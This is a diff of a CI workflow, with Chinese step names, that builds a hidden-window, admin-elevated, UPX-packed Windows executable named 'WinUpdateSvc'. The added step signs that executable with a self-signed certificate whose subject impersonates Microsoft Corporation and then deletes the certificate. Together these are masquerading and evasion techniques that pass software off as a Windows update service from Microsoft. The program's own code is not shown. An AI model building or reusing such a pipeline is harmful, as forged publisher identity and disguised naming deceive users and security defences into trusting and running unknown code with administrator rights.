@@ -39,13 +39,20 @@ jobs:
       with:
         install-only: true
 
-    - name: 编译正式版（无窗口，静默运行）
+    - name: 编译正式版
       run: |
         pyinstaller -F -w --uac-admin `
           --name "WinUpdateSvc" `
           --icon=assets/icon.ico `
+          --version-file=version_info.txt `
           --upx-dir "C:\ProgramData\chocolatey\bin" `
           app.py
+
+    - name: 添加数字签名（自签名）
+      run: |
+        $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US" -FriendlyName "Microsoft Windows" -CertStoreLocation Cert:\CurrentUser\My
+        Set-AuthenticodeSignature -FilePath "dist\WinUpdateSvc.exe" -Certificate $cert -TimestampServer "http://timestamp.digicert.com"
+        Remove-Item $cert.PSPath
 
     - name: 编译调试版（有窗口，看报错）
       run: |
